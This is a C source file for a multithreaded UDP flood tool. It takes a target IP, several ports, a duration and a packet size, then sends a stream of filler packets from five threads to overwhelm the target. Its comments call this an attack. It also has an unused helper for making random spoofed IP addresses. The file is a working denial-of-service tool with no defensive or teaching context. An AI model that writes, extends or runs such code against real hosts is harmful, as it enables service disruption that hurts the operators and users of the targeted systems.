#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>

// Structure to store attack parameters
typedef struct {
    char *target_ip;
    int target_ports[10]; // Support up to 10 ports
    int num_ports;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

volatile int keep_running = 1;

// Signal handler to stop the attack
void handle_signal(int signal) {
    keep_running = 0;
}

// Function to generate a random spoofed IP
char *generate_spoofed_ip() {
    static char spoofed_ip[16];
    snprintf(spoofed_ip, sizeof(spoofed_ip), "%d.%d.%d.%d",
             rand() % 256, rand() % 256, rand() % 256, rand() % 256);
    return spoofed_ip;
}

// UDP Flood function
void *udp_flood(void *params) {
    attack_params *attack = (attack_params *)params;
    struct sockaddr_in target;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(attack->target_ip);

    char *packet = malloc(attack->packet_size);
    if (!packet) {
        perror("Memory allocation failed");
        close(sock);
        pthread_exit(NULL);
    }

    memset(packet, 'A', attack->packet_size);

    time_t end_time = time(NULL) + attack->duration;
    while (time(NULL) < end_time && keep_running) {
        for (int i = 0; i < attack->num_ports; i++) {
            target.sin_port = htons(attack->target_ports[i]);
            sendto(sock, packet, attack->packet_size, 0, (struct sockaddr *)&target, sizeof(target));
        }
    }

    free(packet);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <target_ip> <port1,port2,...> <duration> <packet_size>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int duration = atoi(argv[3]);
    int packet_size = atoi(argv[4]);

    // Parse multiple ports
    int target_ports[10];
    int num_ports = 0;
    char *token = strtok(argv[2], ",");
    while (token != NULL && num_ports < 10) {
        target_ports[num_ports++] = atoi(token);
        token = strtok(NULL, ",");
    }

    int thread_count = 5;
    pthread_t threads[thread_count];
    attack_params params[thread_count];

    signal(SIGINT, handle_signal);

    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        memcpy(params[i].target_ports, target_ports, sizeof(target_ports));
        params[i].num_ports = num_ports;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
            perror("Thread creation failed");
            return EXIT_FAILURE;
        }
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack completed.\n");
    return 0;
}